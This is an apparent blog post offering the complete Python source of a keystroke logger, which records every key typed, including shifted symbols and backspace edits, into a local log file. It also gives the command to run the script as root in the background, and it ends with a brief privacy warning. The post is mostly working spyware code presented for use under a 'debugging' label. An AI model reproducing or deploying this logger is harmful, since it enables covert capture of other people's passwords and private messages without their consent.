---
layout: post
title:  "Keylogger"
date:   2024-06-02 18:30:00 -0500
categories: tools
tags: writeup source-code python tools
---

## Overview
This project is a **keystroke logger** that captures and records the keys pressed on the keyboard, logging them into a file named **keystrokes.log**. It processes each key press event to handle specific actions, such as backspace, special characters, and modifier keys (Ctrl, Shift, Alt), and writes the corresponding character to a log file.

This project is useful for purposes such as creating simple keystroke logging applications, debugging, or testing keyboard input behavior. 

## Demo
![demo](./assets/img/keylogger/demo.gif)

## Source code
```bash
import keyboard

log_file = "keystrokes.log"
shift_special_chars = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    '-': '_',
    '=': '+',
    '[': '{',
    ']': '}',
    '\\': '|',
    ';': ':',
    '\'': '"',
    ',': '<',
    '.': '>',
    '/': '?'
}

def on_key_press(event):
    if event.name == 'backspace':
        # Handle backspace by removing last character
        try:
            with open(log_file, 'r+') as f:
                content = f.read()
                if content:
                    f.seek(0) # To beginning of file
                    f.truncate()  # Clear file contents
                    f.write(content[:-1])  # Rewrite without last character
        except FileNotFoundError:
            pass

    elif event.name in ['ctrl', 'left ctrl', 'right ctrl', 'alt', 'shift'] or 'ctrl' in event.modifiers or 'alt' in event.modifiers:
        pass
    
    else:
        char = event.name
        
        if char == 'space':
            char = ' '
        elif 'shift' in event.modifiers:
            if len(char) == 1 and char.isalpha():
                char = char.upper()
            elif char in shift_special_chars:
                char = shift_special_chars[char]
        elif char == 'enter':
            char = '\n'
        elif char == 'tab':
            char = '\n /tab \n'

        with open(log_file, 'a') as f:
            f.write(char)

keyboard.on_press(on_key_press)
keyboard.wait()
```

## How to use
To run the script, using 
```bash
sudo python3 keylogger.py &
```

To view the log, using
```bash
cat keystrokes.log
```

## Warning
**Keystroke logging can be intrusive and potentially violate privacy**. So it should be used responsibly and ethically.
